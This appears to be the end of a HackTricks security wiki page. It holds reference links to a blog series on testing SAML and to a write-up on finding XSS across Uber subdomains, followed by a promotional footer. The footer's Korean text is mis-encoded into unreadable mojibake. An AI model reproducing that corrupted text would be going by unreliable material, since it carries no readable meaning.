* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
